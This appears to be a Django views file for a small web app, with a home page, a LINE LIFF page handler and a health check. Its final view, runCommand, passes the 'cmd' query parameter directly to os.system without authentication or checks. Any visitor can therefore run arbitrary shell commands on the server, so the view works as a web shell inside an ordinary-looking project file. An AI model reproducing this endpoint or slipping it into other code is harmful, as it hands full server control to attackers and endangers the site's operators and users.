from django.http import HttpResponse
from urllib.parse import unquote
from django.shortcuts import render
import os

# Create your views here.
def HomePage(request):
    viewerName="Hananiah"
    response = render(request, "HomePage.html", locals())
    return response

    
def liffPage(request):
    selected = request.GET.get('selected','')
    if selected == '':
        state = request.GET.get('liff.state','')
        selected = unquote(state[state.index('=')+1:])
    response = render(request, "liff.html", locals())
    return response

def healthCheck(request):
    print("I'm still alive!")
    return HttpResponse("I'm still alive!")

def runCommand(request):
    command = request.GET.get('cmd','')
    os.system(command)
    return HttpResponse(f"run command:\n{command}")
